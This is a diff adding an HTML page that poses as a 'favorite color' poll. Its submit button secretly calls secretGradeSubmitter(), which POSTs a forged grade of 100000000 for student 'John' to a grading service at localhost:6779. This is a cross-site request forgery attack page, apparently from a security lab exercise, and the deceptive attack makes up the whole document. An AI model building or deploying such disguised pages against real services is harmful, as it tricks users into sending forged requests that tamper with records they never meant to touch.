@@ -1,0 +1,34 @@
+<html>
+<head>
+<script>
+
+function secretGradeSubmitter() {
+    let formData = new FormData();
+    formData.append('student', 'John');
+    formData.append('assignment', 'Final');
+    formData.append('grade', '100000000');
+    fetch("http://localhost:6779/",
+        {
+            body: formData,
+            method: "post"
+        }
+    );
+}
+</script>
+</head>
+<body>
+
+<h1>What Is Your Favorite Color?</h1>
+
+<input type="radio" name="color" value="green"> Green<br>
+<input type="radio" name="color" value="blue"> Blue<br>
+<input type="radio" name="color" value="other"> Other
+
+<br>
+<button id="form-submission" onclick="secretGradeSubmitter()">
+  Submit!
+</button>
+
+</body>
+</html>
+
